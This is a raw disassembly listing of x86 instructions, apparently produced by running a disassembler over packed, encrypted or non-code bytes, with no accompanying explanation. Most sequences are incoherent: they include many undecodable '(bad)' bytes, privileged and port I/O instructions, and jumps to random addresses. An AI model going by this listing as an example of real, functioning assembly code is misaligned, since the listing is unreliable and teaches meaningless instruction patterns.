  4068b9:	adc    DWORD PTR [eax+0x7abef326],eax
  4068bf:	pop    ds
  4068c0:	(bad)  
  4068c1:	xlat   BYTE PTR ds:[ebx]
  4068c2:	inc    ebp
  4068c3:	and    al,0xfd
  4068c5:	(bad)  
  4068c7:	xchg   edi,eax
  4068c8:	je     0x40693b
  4068ca:	sti    
  4068cb:	add    al,0x3d
  4068cd:	shr    DWORD PTR [edx],cl
  4068cf:	cli    
  4068d0:	pusha  
  4068d1:	jl     0x4068bd
  4068d3:	addr16 mov dl,0xc0
  4068d6:	iret   
  4068d7:	int    0x6d
  4068d9:	fst    QWORD PTR [edx-0xc204752]
  4068df:	pop    es
  4068e0:	add    edi,DWORD PTR [esi+ebx*2]
  4068e3:	ins    BYTE PTR es:[edi],dx
  4068e4:	pop    ecx
  4068e5:	or     ecx,ecx
  4068e7:	ffree  st(1)
  4068e9:	ins    DWORD PTR es:[edi],dx
  4068ea:	xchg   edi,eax
  4068eb:	sbb    al,0x45
  4068ed:	xor    eax,0x2eacee97
  4068f2:	jns    0x40695e
  4068f4:	out    dx,al
  4068f5:	sub    al,0xcb
  4068f7:	(bad)  
  4068f8:	cmp    esp,esi
  4068fa:	int    0x9d
  4068fc:	cwde   
  4068fd:	adc    BYTE PTR [eax-0x1a],0x32
  406901:	lock in al,dx
  406903:	push   0x1e
  406905:	ins    BYTE PTR es:[edi],dx
  406906:	loopne 0x4068d5
  406908:	cdq    
  406909:	xchg   esp,eax
  40690a:	popf   
  40690b:	jbe    0x406983
  40690d:	cs call 0x8436:0xb19d3ec2
  406915:	clc    
  406916:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406917:	shl    DWORD PTR [edi+0x7c4fce9d],1
  40691d:	pop    edi
  40691e:	bound  eax,QWORD PTR [ebp+edi*1-0x2a]
  406922:	add    eax,0x594b68f8
  406927:	jle    0x40698e
  406929:	clc    
  40692a:	sbb    DWORD PTR [ebx-0x7c],ecx
  40692d:	sub    cl,bl
  40692f:	cmp    al,0xab
  406931:	pop    ecx
  406932:	xchg   esp,eax
  406933:	xor    bh,bh
  406935:	push   esp
  406936:	shr    DWORD PTR [esi-0x2c],0x3f
  40693a:	dec    esi
  40693b:	mov    esi,0xc62f2358
  406940:	adc    BYTE PTR [ebx],ch
  406942:	scas   eax,DWORD PTR es:[edi]
  406943:	mov    BYTE PTR [esi+0x2de03384],dh
  406949:	sbb    eax,0x8aefe020
  40694e:	push   cs
  40694f:	sub    ebx,DWORD PTR [ecx+ecx*2+0x976074e]
  406956:	mov    cl,0xa3
  406958:	adc    DWORD PTR [eax],ebp
  40695a:	cmp    ecx,edx
  40695c:	mov    ds:0x737097f9,al
  406961:	pop    edi
  406962:	pop    ds
  406963:	and    DWORD PTR [eax],eax
  406965:	out    0x8,eax
  406967:	scas   al,BYTE PTR es:[edi]
  406968:	jae    0x406997
  40696a:	ins    DWORD PTR es:[edi],dx
  40696b:	mov    BYTE PTR [ebp+eax*1-0x63],dl
  40696f:	add    BYTE PTR ds:0xaac8b9ec,0x70
  406976:	mov    esi,0xd964ba7d
  40697b:	and    BYTE PTR [eax+0x615cb4b2],ah
  406981:	nop
  406982:	enter  0x6790,0x33
  406986:	pop    ebx
  406987:	iret   
  406988:	into   
  406989:	loopne 0x4069d6
  40698b:	inc    edi
  40698c:	inc    edx
  40698d:	icebp  
  40698e:	dec    edi
  40698f:	cli    
  406990:	int3   
  406991:	sbb    BYTE PTR [edi+eax*4-0x61],ah
  406995:	and    ch,BYTE PTR [edx]
  406997:	mov    esp,0x8101322f
  40699c:	sbb    DWORD PTR [edi],edi
  40699e:	ds push ss
  4069a0:	push   edi
  4069a1:	test   eax,0x6978c9a6
  4069a6:	sub    eax,ebp
  4069a8:	sub    esi,ecx
  4069aa:	xor    DWORD PTR [ecx],0x10f4e88
  4069b0:	or     ebx,ebx
  4069b2:	aaa    
  4069b3:	ret    0x6dd2
  4069b6:	fwait
  4069b7:	jle    0x40693e
  4069b9:	fcomp  DWORD PTR [edi]
  4069bb:	jo     0x4069e1
  4069bd:	mov    ch,BYTE PTR ds:0x28d05c95
  4069c3:	mov    ds:0x22af743e,al
  4069c8:	out    dx,eax
  4069c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069ca:	arpl   WORD PTR [eax],bp
  4069cc:	cmp    eax,0x916b5d50
  4069d1:	ins    BYTE PTR es:[edi],dx
  4069d2:	stos   DWORD PTR es:[edi],eax
  4069d3:	and    DWORD PTR [eax],0xf1d16b3e
  4069d9:	lods   eax,DWORD PTR ds:[esi]
  4069da:	(bad)  
  4069db:	(bad)  
  4069dc:	push   0x9c33711a
  4069e1:	pop    edx
  4069e2:	test   DWORD PTR [eax],esp
  4069e4:	outs   dx,BYTE PTR ds:[esi]
  4069e5:	scas   eax,DWORD PTR es:[edi]
  4069e6:	movq   mm0,QWORD PTR [edi-0x1b]
  4069ea:	(bad)  
  4069eb:	out    dx,al
  4069ec:	nop
  4069ed:	inc    edx
  4069ee:	ins    BYTE PTR es:[edi],dx
  4069ef:	enter  0xd018,0x3b
  4069f3:	push   ss
  4069f4:	sbb    al,0x65
  4069f6:	dec    edx
  4069f7:	pop    edx
  4069f8:	push   es
  4069f9:	fs ss (bad) 
  4069fd:	int    0x83
  4069ff:	cmc    
  406a00:	test   eax,0xe5276463
  406a05:	dec    esi
  406a06:	adc    cl,BYTE PTR [esi]
  406a08:	sbb    eax,0xed7d50d6
  406a0d:	push   ebp
  406a0e:	jecxz  0x406996
  406a10:	mov    esi,0x444c2818
  406a15:	pop    edi
  406a16:	icebp  
  406a17:	adc    BYTE PTR [edx],0x6c
  406a1a:	push   ecx
  406a1b:	pop    ebp
  406a1c:	nop
  406a1d:	fs jg  0x406a66
  406a20:	or     BYTE PTR [edi+esi*8-0x4a],bh
  406a24:	das    
  406a25:	and    BYTE PTR [ebx+0x49407a0],bh
  406a2b:	push   0xf492907d
  406a30:	pushf  
  406a31:	or     eax,0xd870ab93
  406a36:	lods   al,BYTE PTR ds:[esi]
  406a37:	dec    edi
  406a38:	cdq    
  406a39:	inc    edi
  406a3a:	ds jns 0x5a82c127
  406a41:	rol    DWORD PTR [edi],cl
  406a43:	mov    eax,0xbbb35a6
  406a48:	es mov eax,0xf7f576bf
  406a4e:	retf   
  406a4f:	jmp    0x406a6b
  406a51:	inc    esi
  406a52:	and    ch,0x2e
  406a55:	(bad)  
  406a56:	daa    
  406a57:	ret    
  406a58:	pop    ecx
  406a59:	sub    BYTE PTR [edi],dh
  406a5b:	loope  0x406a7f
  406a5d:	mov    edi,DWORD PTR [esi]
  406a5f:	xchg   esi,eax
  406a60:	(bad)  
  406a61:	adc    eax,DWORD PTR [esi-0x14a7bf1c]
  406a67:	jp     0x406a5a
  406a69:	cmp    DWORD PTR [esi+eiz*2-0x7],esp
  406a6d:	ror    BYTE PTR [esi+0x127f20be],cl
  406a73:	in     al,dx
  406a74:	push   edi
  406a75:	pop    ecx
  406a76:	push   edi
  406a77:	ins    BYTE PTR es:[edi],dx
  406a78:	jmp    0x4f574683
  406a7d:	imul   ebp,DWORD PTR [ebx+0x38],0xaa34f7c8
  406a84:	mov    ebp,0xf3c7e67
  406a89:	or     eax,0x94526f25
  406a8e:	pop    esp
  406a8f:	(bad)  
  406a90:	fnstsw WORD PTR [edi]
  406a92:	or     BYTE PTR [ecx+0x6554a6e3],cl
  406a98:	or     DWORD PTR [eax+0x2916ac6c],ecx
  406a9e:	cmp    al,0x8b
  406aa0:	inc    esp
  406aa1:	mov    dh,0x15
  406aa3:	push   edx
  406aa4:	xchg   DWORD PTR [esi],ecx
  406aa6:	pop    ebx
  406aa7:	sub    DWORD PTR [esi],ebp
  406aa9:	(bad)  
  406aab:	jp     0x406ae8
  406aad:	sub    eax,0x7ccb8102
  406ab2:	pushf  
  406ab3:	pop    ebx
  406ab4:	es inc edi
  406ab6:	call   0xd78a0e0d
  406abb:	adc    BYTE PTR [esi+0x4d011574],ch
  406ac1:	imul   ecx,DWORD PTR [eax+0x6ab8a6ce],0x12e5ab1a
  406acb:	dec    eax
  406acc:	cmp    DWORD PTR [ebp-0x3a],0xd2340f26
  406ad3:	scas   al,BYTE PTR es:[edi]
  406ad4:	pop    es
  406ad5:	pop    eax
  406ad6:	scas   eax,DWORD PTR es:[edi]
  406ad7:	sbb    ebp,DWORD PTR [edx+0xa16ce67]
  406add:	cmp    ebp,DWORD PTR [edi+0x5d]
  406ae0:	or     DWORD PTR ds:0x67c6c71b,ebx
  406ae6:	pop    ds
  406ae7:	ret    
  406ae8:	ss dec ecx
  406aea:	pusha  
  406aeb:	sub    DWORD PTR [edx+0x28],ebp
  406aee:	mov    eax,ds:0x5645252e
  406af3:	int    0x75
  406af5:	xor    esi,edi
  406af7:	adc    eax,0xe31e6860
  406afc:	std    
  406afd:	inc    ecx
  406afe:	push   ds
  406aff:	ss or  bl,dl
  406b02:	icebp  
  406b03:	dec    eax
  406b04:	pushf  
  406b05:	xchg   DWORD PTR [edi+0x23b55a0c],esp
  406b0b:	je     0x406ae7
  406b0d:	sub    al,0xa7
  406b0f:	nop    DWORD PTR [ebx+0x50ffe462]
  406b16:	and    eax,0x6d5df198
  406b1b:	pop    ebx
  406b1c:	jnp    0x406b0d
  406b1e:	push   eax
  406b1f:	jb     0x406b7c
  406b21:	sub    DWORD PTR [ecx-0x757e06c6],edx
  406b27:	dec    edi
  406b28:	pop    ss
  406b29:	cwde   
  406b2a:	loope  0x406b20
  406b2c:	mov    eax,0x1d7a1cdc
  406b31:	cmp    al,0xc7
  406b33:	xchg   ecx,eax
  406b34:	pop    edx
  406b35:	cmp    ecx,DWORD PTR [ecx-0x45]
  406b38:	inc    ebp
  406b39:	in     al,dx
  406b3a:	jecxz  0x406b08
  406b3c:	sbb    al,0x50
  406b3e:	ins    BYTE PTR es:[edi],dx
  406b3f:	and    eax,0x853e5ca9
  406b44:	std    
  406b45:	pop    edi
  406b46:	jl     0x406ae3
  406b48:	jp     0x406bbf
  406b4a:	rcl    DWORD PTR [edi],1
  406b4c:	or     DWORD PTR [ebx+0x3b],esp
  406b4f:	and    eax,0xaac0dd25
  406b54:	ins    BYTE PTR es:[edi],dx
  406b55:	xor    DWORD PTR [edx],ebx
  406b57:	fdiv   DWORD PTR es:[ebp+edi*8+0x2158357f]
  406b5f:	pop    eax
  406b60:	ret    
  406b61:	push   cs
  406b62:	loopne 0x406b33
  406b64:	sti    
  406b65:	mov    eax,0x95ef2c1
  406b6a:	hlt    
  406b6b:	shl    BYTE PTR [edi+0x656faa85],0xb
  406b72:	(bad)  
  406b73:	adc    eax,0xc1f1e34e
  406b78:	dec    ebx
  406b79:	sub    eax,0xb7ab8946
  406b7e:	or     al,0x5c
  406b80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b81:	mov    ds:0x5fc4a2f0,al
  406b86:	in     al,dx
  406b87:	ficom  WORD PTR [edx]
  406b89:	imul   ebp,DWORD PTR [edx],0x84119c8e
  406b8f:	xlat   BYTE PTR ds:[ebx]
  406b90:	adc    DWORD PTR [eax-0x62cf06ff],ebx
  406b96:	mov    DWORD PTR [eax-0x56],0x6f76ec06
  406b9d:	clc    
  406b9e:	dec    eax
  406b9f:	enter  0xc026,0xb3
  406ba3:	fsub   QWORD PTR [eax]
  406ba5:	ds scas eax,DWORD PTR es:[edi]
  406ba7:	pop    es
  406ba8:	push   es
  406ba9:	mov    ds:0x4ef08ac1,al
  406bae:	shr    BYTE PTR [edi],cl
  406bb0:	imul   ecx,DWORD PTR [ebx-0x2f777c2c],0x496d89de
  406bba:	repz mov esi,0x25f3a06b
  406bc0:	shl    DWORD PTR [ebx+0xb],0xd9
  406bc4:	imul   ebp,ebx,0xffffffd4
  406bc7:	arpl   bx,ax
  406bc9:	xor    esp,eax
  406bcb:	jmp    0xaf9ebd2d
  406bd0:	or     bl,BYTE PTR [edi-0x45]
  406bd3:	mul    BYTE PTR [ecx]
  406bd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406bd6:	out    dx,al
  406bd7:	ja     0x406b86
  406bd9:	mov    edi,0x8e449491
  406bde:	mov    DWORD PTR [ebx-0x6db8e849],0x7a44c018
  406be8:	jo     0x406b8a
  406bea:	iret   
  406beb:	sub    eax,DWORD PTR [ecx-0x418ee066]
  406bf1:	retf   0xb27a
  406bf4:	push   edi
  406bf5:	in     al,dx
  406bf6:	add    cl,BYTE PTR [eax+0x6e]
  406bf9:	enter  0xf6ce,0x92
  406bfd:	xchg   ebx,eax
  406bfe:	mov    al,ds:0xefaaca0a
  406c03:	push   0x967bc25e
  406c08:	leave  
  406c09:	mov    ds:0x53d151ad,eax
  406c0e:	push   cs
  406c0f:	ss cdq 
  406c11:	sar    DWORD PTR [ebx],cl
  406c13:	cmc    
  406c14:	mov    cl,0x34
  406c16:	pop    ecx
  406c17:	or     cl,BYTE PTR [edx+esi*8]
  406c1a:	cwde   
  406c1b:	lds    edx,FWORD PTR [eax]
  406c1d:	pop    edx
  406c1e:	mov    ?,esp
  406c20:	in     al,0x42
  406c22:	dec    eax
  406c23:	or     bl,ch
  406c25:	mov    esi,0x1ef94f14
  406c2a:	sbb    edi,DWORD PTR [eax+0x34]
  406c2d:	enter  0x5401,0xc
  406c31:	aas    
  406c32:	add    eax,0x268dbc1f
  406c37:	adc    al,0xd9
  406c39:	arpl   WORD PTR [ecx-0x6f0238e9],ax
  406c3f:	push   0xffffffe0
  406c41:	gs mov ah,0x11
  406c44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c45:	data16 aam 0x4b
  406c48:	mov    bl,0x8b
  406c4a:	rol    BYTE PTR [edi+0x39],1
  406c4d:	mov    ah,0xcd
  406c4f:	test   ebp,ebp
  406c51:	js     0x406c6d
  406c53:	xchg   ecx,eax
  406c54:	mov    dh,0x78
  406c56:	aad    0xb3
  406c58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c59:	cmp    edx,edx
  406c5b:	dec    esp
  406c5c:	scas   al,BYTE PTR es:[edi]
  406c5d:	jmp    0x97f176ad
  406c62:	xor    al,0x3
  406c64:	push   es
  406c65:	rep ins DWORD PTR es:[edi],dx
  406c67:	dec    edx
  406c68:	aaa    
  406c69:	ins    DWORD PTR es:[edi],dx
  406c6a:	and    eax,0xb558aed6
  406c6f:	dec    esi
  406c70:	jb     0x406c82
  406c72:	inc    esi
  406c73:	jmp    0x49ad104c
  406c78:	es jne 0x406c8b
  406c7b:	push   eax
  406c7c:	mov    al,ds:0x5d5cbe12
  406c81:	sub    al,0xe6
  406c83:	cmp    bl,BYTE PTR [ebx+0x1f64cac7]
  406c89:	(bad)  
  406c8a:	scas   al,BYTE PTR es:[edi]
  406c8b:	mov    esp,0x609259c1
  406c90:	jae    0x406c25
  406c92:	(bad)  
  406c93:	bound  eax,QWORD PTR [ebx+0x498cdc0c]
  406c99:	pop    edx
  406c9a:	push   edi
  406c9b:	mov    edi,0x852cf0d
  406ca0:	sbb    eax,0xdcc87fbc
  406ca5:	jne    0x406c41
  406ca7:	mov    ds:0x26e1fef2,eax
  406cac:	dec    edi
  406cad:	leave  
  406cae:	sbb    BYTE PTR [edi+0x24],dh
  406cb1:	icebp  
  406cb2:	mov    ah,0x94
  406cb4:	(bad)  
  406cb5:	mov    ebx,0x47302fb7
  406cba:	std    
  406cbb:	in     al,dx
  406cbc:	jmp    0x406d1b
  406cbe:	cmp    edi,DWORD PTR [esi-0x76]
  406cc1:	mov    bl,0xbb
  406cc3:	push   esp
  406cc4:	mov    ds:0xae3b9606,al
  406cc9:	sbb    ebx,DWORD PTR [ecx]
  406ccb:	test   DWORD PTR [eax+0xa8324e4],ecx
  406cd1:	jbe    0x406d0f
  406cd3:	and    cl,BYTE PTR ds:0x6d6a2f77
  406cd9:	xchg   esp,eax
  406cda:	or     eax,0x4f9b54dc
  406cdf:	xor    ecx,ecx
  406ce1:	xchg   ebx,eax
  406ce2:	cmp    bh,al
  406ce4:	push   esi
  406ce5:	and    ebx,DWORD PTR [edi-0x31]
  406ce8:	sbb    DWORD PTR [eax],ebp
  406cea:	in     eax,0xf
  406cec:	sbb    al,0xd5
  406cee:	mov    ds:0xe722d99e,eax
  406cf3:	repnz xor al,0xf5
  406cf6:	adc    BYTE PTR [edx],bl
  406cf8:	mov    ebp,eax
  406cfa:	ret    
  406cfb:	lods   eax,DWORD PTR ds:[esi]
  406cfc:	add    esp,DWORD PTR [ebx+0x1332dc14]
  406d02:	les    eax,FWORD PTR [eax+0x39]
  406d05:	cdq    
  406d06:	dec    esi
  406d07:	mov    BYTE PTR [eax],al
  406d09:	xchg   esp,eax
  406d0a:	mov    DWORD PTR [eax-0x4d23f30f],ecx
  406d10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d11:	push   es
  406d12:	mov    ebx,0xc14d7b54
  406d17:	push   edi
  406d18:	shl    DWORD PTR [ecx+0x359829fe],1
  406d1e:	(bad)  
  406d20:	dec    ebx
  406d21:	jbe    0x406d2e
  406d23:	jp     0x406d80
  406d25:	jno    0x406d43
  406d27:	jo     0x406cb3
  406d29:	nop
  406d2a:	fs icebp 
  406d2c:	cld    
  406d2d:	and    eax,edi
  406d2f:	mov    ebx,edi
  406d31:	cwde   
  406d32:	sbb    DWORD PTR [edx+0x7a],esp
  406d35:	mov    ah,0x79
  406d37:	sub    eax,0x792485cf
  406d3c:	and    dl,BYTE PTR [ecx-0x14f645cf]
  406d42:	ret    
  406d43:	cmc    
  406d44:	pop    ds
  406d45:	ret    0x6ee2
  406d48:	push   0xffffff8b
  406d4a:	xlat   BYTE PTR ds:[ebx]
  406d4b:	loope  0x406d6a
  406d4d:	jns    0x406cd2
  406d4f:	mov    ebp,0x56d91d7f
  406d54:	daa    
  406d55:	(bad)  
  406d56:	loope  0x406d3c
  406d58:	ins    DWORD PTR es:[edi],dx
  406d59:	das    
  406d5a:	aad    0xcb
  406d5c:	out    0x43,eax
  406d5e:	xchg   DWORD PTR [edx-0x2e7111a8],ebp
  406d64:	sub    al,0x7c
  406d66:	loop   0x406d8d
  406d68:	sub    eax,0x8f2231ab
  406d6d:	arpl   WORD PTR [edi+0x6f53bcc1],ax
  406d73:	stos   BYTE PTR es:[edi],al
  406d74:	cvttps2pi mm7,QWORD PTR [edx-0x2]
  406d78:	mov    esi,0xc69d827e
  406d7d:	add    al,ch
  406d7f:	cdq    
  406d80:	in     eax,dx
  406d81:	mov    cl,0xe0
  406d83:	test   al,0x21
  406d85:	test   DWORD PTR [ebx-0x75],0xe973399c
  406d8c:	add    eax,0x61746c9c
  406d91:	push   0xffffff8d
  406d93:	inc    ecx
  406d94:	jnp    0x406d30
  406d96:	and    ebx,esp
  406d98:	jge    0x406d9d
  406d9a:	pushf  
  406d9b:	int3   
  406d9c:	pushf  
  406d9d:	push   edx
  406d9e:	fs dec esp
  406da0:	(bad)  
  406da1:	in     al,0x84
  406da3:	les    ecx,FWORD PTR [eax-0x7abfd82]
  406da9:	test   eax,0x1e3c8537
  406dae:	dec    ecx
  406daf:	sti    
  406db0:	cld    
  406db1:	jno    0x406dbe
  406db3:	addr16 lock cdq 
  406db6:	(bad)  
  406db7:	out    dx,al
  406db8:	adc    DWORD PTR [eax-0x715d64eb],esi
  406dbe:	je     0x406d4b
  406dc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406dc1:	das    
  406dc2:	pop    ecx
  406dc3:	pop    edi
  406dc4:	push   ss
  406dc5:	lds    edx,FWORD PTR [edx]
  406dc7:	pop    eax
  406dc8:	push   ebx
  406dc9:	fwait
  406dca:	sub    DWORD PTR [edi],eax
  406dcc:	xchg   ebp,eax
  406dcd:	test   al,0x83
  406dcf:	mov    bh,0xe4
  406dd1:	or     BYTE PTR [edx],dl
  406dd3:	inc    esi
  406dd4:	mov    bl,BYTE PTR ds:0x22beb126
  406dda:	mov    ss,WORD PTR [ebx+0x78]
  406ddd:	ret    0x58e5
  406de0:	add    DWORD PTR ds:0x453011c1,ebp
  406de6:	adc    eax,0x3c1c1378
  406deb:	pop    ebx
  406dec:	pop    ecx
  406ded:	int3   
  406dee:	stos   DWORD PTR es:[edi],eax
  406def:	pop    ds
  406df0:	dec    ecx
  406df1:	and    al,cl
  406df3:	cli    
  406df4:	dec    edi
  406df5:	clc    
  406df6:	popa   
  406df7:	icebp  
  406df8:	aad    0x88
  406dfa:	loope  0x406da8
  406dfc:	push   eax
  406dfd:	pop    ss
  406dfe:	outs   dx,DWORD PTR ds:[esi]
  406dff:	jl     0x406e7f
  406e01:	dec    esp
  406e02:	icebp  
  406e03:	bound  edx,QWORD PTR [edx+0x1a]
  406e06:	in     eax,0x9d
  406e08:	push   ss
  406e09:	xchg   esp,eax
  406e0a:	jb     0x406e04
  406e0c:	jne    0x406e7f
  406e0e:	icebp  
  406e0f:	add    ebx,DWORD PTR [edi-0x5eef0319]
  406e15:	out    0x88,al
  406e17:	dec    esp
  406e18:	sub    al,0xe3
  406e1a:	xchg   BYTE PTR [esi],ch
  406e1c:	add    al,0x20
  406e1e:	and    DWORD PTR [eax+edx*8-0xe867a23],edx
  406e25:	push   ebx
  406e26:	mov    ch,0x7f
  406e28:	fsub   st,st(5)
  406e2a:	int    0x49
  406e2c:	(bad)  
  406e2e:	pop    ebx
  406e2f:	call   0x733c:0xde3275d3
  406e36:	dec    ecx
  406e37:	leave  
  406e38:	pop    esi
  406e39:	mov    es,WORD PTR [ecx]
  406e3b:	mov    ebp,0x9304ffa
  406e40:	jb     0x406e07
  406e42:	mov    bl,0x91
  406e44:	f2xm1  
  406e46:	std    
  406e47:	aaa    
  406e48:	jo     0x406e73
  406e4a:	loop   0x406e7a
  406e4c:	sub    ah,BYTE PTR [esi]
  406e4e:	ror    BYTE PTR [eax+edi*2],cl
  406e51:	add    ebp,DWORD PTR [eax+0x6e]
  406e54:	jnp    0x406e6a
  406e56:	adc    al,0x3d
  406e58:	lods   eax,DWORD PTR ds:[esi]
  406e59:	or     al,BYTE PTR [esi+esi*1+0x418a7af1]
  406e60:	sub    DWORD PTR [edx+0x7de3dc6],edi
  406e66:	adc    bl,BYTE PTR [ebp-0x3adf4c28]
  406e6c:	mov    ebx,0x2839dbaf
  406e71:	test   eax,0x50cab058
  406e76:	xchg   esp,eax
  406e77:	sub    BYTE PTR [bp+di-0x7df],0x8
  406e7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e7f:	xchg   ecx,eax
  406e80:	gs push es
  406e82:	sub    DWORD PTR [esi+0x16],ebx
  406e85:	fdivr  QWORD PTR [ebp-0x7c0cea06]
  406e8b:	retf   0x2930
  406e8e:	pop    ss
  406e8f:	retf   
  406e90:	int3   
  406e91:	xchg   ebx,eax
  406e92:	mov    esi,0xee2c5550
  406e97:	mov    eax,0x54ed11c4
  406e9c:	push   edx
  406e9d:	fmul   DWORD PTR [esi-0x29]
  406ea0:	or     ebp,ebp
  406ea2:	dec    ebx
  406ea3:	or     al,0xe
  406ea5:	mov    esi,0x74ccc1d2
  406eaa:	cmp    eax,0xda1445fc
  406eaf:	jecxz  0x406e5e
  406eb1:	into   
  406eb2:	inc    ebp
  406eb3:	pop    ds
  406eb4:	jecxz  0x406f0f
  406eb6:	out    0xbd,eax
  406eb8:	ja     0x406e84
  406eba:	(bad)  
  406ebb:	lock add DWORD PTR [ebx+0x62e4ad8c],edi
  406ec2:	xor    BYTE PTR [eax+0x4232b40d],cl
  406ec8:	cmp    dl,BYTE PTR fs:[ebp-0x79c9b670]
  406ecf:	pop    ebx
  406ed0:	rcr    BYTE PTR [edx+0x44d9fec8],0x33
  406ed7:	push   0xcbcc10d1
  406edc:	loope  0x406ebe
  406ede:	and    esp,DWORD PTR [ecx+0x35]
  406ee1:	hlt    
  406ee2:	fwait
  406ee3:	sub    BYTE PTR [ebp-0x26a3f7cc],0x3c
  406eea:	mov    eax,ds:0xfbb01452
  406eef:	dec    esp
  406ef0:	hlt    
  406ef1:	test   BYTE PTR [edi+0x22],0x84
  406ef5:	scas   eax,DWORD PTR es:[edi]
  406ef6:	popf   
  406ef7:	popa   
  406ef8:	pop    es
  406ef9:	push   edi
  406efa:	push   edi
  406efb:	(bad)  
  406efc:	outs   dx,DWORD PTR ds:[esi]
  406efd:	jbe    0x406f15
  406eff:	cli    
  406f00:	and    eax,0x46f86d05
  406f05:	cmp    al,0x7d
  406f07:	cmp    esi,DWORD PTR [eax-0x49]
  406f0a:	lahf   
  406f0b:	pop    edi
  406f0c:	and    DWORD PTR [ecx+0x6],ebp
  406f0f:	sbb    eax,esp
  406f11:	fistp  QWORD PTR [eax+0x72441955]
  406f17:	jmp    0x504d:0x6e250a90
  406f1e:	aaa    
  406f1f:	das    
  406f20:	pop    edx
  406f21:	cmp    ecx,DWORD PTR [ebp+0x2d]
  406f24:	xchg   ecx,eax
  406f25:	pop    ebx
  406f26:	ins    DWORD PTR es:[edi],dx
  406f27:	inc    eax
  406f28:	mov    ecx,0x1b176644
  406f2d:	shl    BYTE PTR [edx],0x58
  406f30:	jecxz  0x406f03
  406f32:	mov    dl,0xe9
  406f34:	jecxz  0x406f7a
  406f36:	and    eax,0x9eddb0ab
  406f3b:	cli    
  406f3c:	sbb    esp,edx
  406f3e:	mov    es,WORD PTR [edi+0x62]
  406f41:	bound  esp,QWORD PTR [ecx-0x65]
  406f44:	mov    ds:0x53c831be,eax
  406f49:	cs ret 0x9d1b
  406f4d:	ins    BYTE PTR es:[edi],dx
  406f4e:	(bad)  
  406f4f:	stc    
  406f50:	push   ss
  406f51:	pop    edi
  406f52:	xchg   esi,eax
  406f53:	iret   
  406f54:	mov    esp,0xe478e2e7
  406f59:	dec    ebx
  406f5a:	inc    ebp
  406f5b:	inc    ecx
  406f5c:	push   0x71
  406f5e:	ret    0x10db
  406f61:	cmp    cl,cl
  406f63:	mov    BYTE PTR [edx+eiz*8-0x6decebfb],cl
  406f6a:	cdq    
  406f6b:	mov    bh,0x35
  406f6d:	pop    edi
  406f6e:	jo     0x406f1c
  406f70:	cmp    bh,dl
  406f72:	mov    ss,ecx
  406f74:	stos   BYTE PTR es:[edi],al
  406f75:	jo     0x406f4d
  406f77:	mov    dl,0xf3
  406f79:	pop    ss
  406f7a:	mov    edi,0x9e3d9ee2
  406f7f:	push   0xd
  406f81:	jns    0x406ff3
  406f83:	(bad)  
  406f84:	fidivr WORD PTR [ecx+0x17]
  406f87:	add    edi,DWORD PTR [ecx]
  406f89:	out    dx,al
  406f8a:	in     al,dx
  406f8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f8c:	fnstsw WORD PTR [edi+0x13]
  406f8f:	xchg   ebx,eax
  406f90:	or     ecx,ecx
  406f92:	sbb    al,0x16
  406f94:	fmul   st,st(7)
  406f96:	lock ins DWORD PTR es:[edi],dx
  406f98:	clc    
  406f99:	pop    esi
  406f9a:	xor    esi,DWORD PTR [ecx-0x2bcb7422]
  406fa0:	into   
  406fa1:	rol    BYTE PTR [ebx],0xa3
  406fa4:	shl    DWORD PTR [edi-0x71],1
  406fa7:	into   
  406fa8:	or     al,ch
  406faa:	lods   al,BYTE PTR ds:[esi]
  406fab:	enter  0x8c33,0x7e
  406faf:	fisttp WORD PTR [edx+0x3ed7fe65]
  406fb5:	shr    BYTE PTR [edi-0x11],1
  406fb8:	loop   0x406f96
  406fba:	add    cl,cl
  406fbc:	add    eax,0xc590899f
  406fc1:	rcl    BYTE PTR [ecx+0x4a],1
  406fc4:	pop    eax
  406fc5:	push   ss
  406fc6:	aam    0x48
  406fc8:	pusha  
  406fc9:	push   es
  406fca:	xor    ebp,DWORD PTR [ebp+0x59265ea2]
  406fd0:	jg     0x406f9c
  406fd2:	xor    al,0xf9
  406fd4:	mov    al,0x9e
  406fd6:	or     ebp,edi
  406fd8:	out    dx,al
  406fd9:	iret   
  406fda:	loop   0x407014
  406fdc:	into   
  406fdd:	dec    ebx
  406fde:	add    dl,ah
  406fe0:	fld    QWORD PTR [eax+0x4e]
  406fe3:	push   eax
  406fe4:	jecxz  0x406fa5
  406fe6:	cmp    BYTE PTR [esi+0x48],0xb8
  406fea:	je     0x40701d
  406fec:	jmp    0x5d07:0xfe7a1b23
  406ff3:	out    dx,al
  406ff4:	add    eax,0x734df7be
  406ff9:	lods   al,BYTE PTR ds:[esi]
  406ffa:	mov    DWORD PTR [bx-0x29b2],ebx
  406fff:	xchg   edi,eax
  407000:	mov    bh,0x78
  407002:	cmp    DWORD PTR [edx+edi*4],esp
  407005:	push   ebp
  407006:	jl     0x406fec
  407008:	and    al,0x57
  40700a:	out    dx,al
  40700b:	xchg   edi,eax
  40700c:	dec    ebx
  40700d:	pushf  
  40700e:	mov    esi,0x36d25b65
  407013:	xor    edi,DWORD PTR [esi+0x73]
  407016:	inc    ecx
  407017:	outs   dx,BYTE PTR ds:[esi]
  407018:	(bad)
  40701b:	mov    bh,0xaa
  40701d:	xchg   esi,eax
  40701e:	aad    0xc5
  407020:	push   ebp
  407021:	shl    al,cl
  407023:	mov    ah,0x7
  407025:	or     bl,0x4f
  407028:	jp     0x406ff3
  40702a:	sbb    bl,BYTE PTR [edi-0x33aed3d]
  407030:	daa    
  407031:	adc    DWORD PTR [eax-0x5],ebp
  407034:	mov    cl,0x16
  407036:	rcl    BYTE PTR [edx-0x40d344e0],cl
  40703c:	jo     0x407030
  40703e:	fnstcw WORD PTR [edi]
  407040:	xor    BYTE PTR [ecx],cl
  407042:	push   ds
  407043:	jo     0x40701b
  407045:	push   eax
  407046:	xchg   ebp,eax
  407047:	fdivr  st,st(5)
  407049:	xchg   ecx,eax
  40704a:	mov    ebp,esi
  40704c:	pop    ss
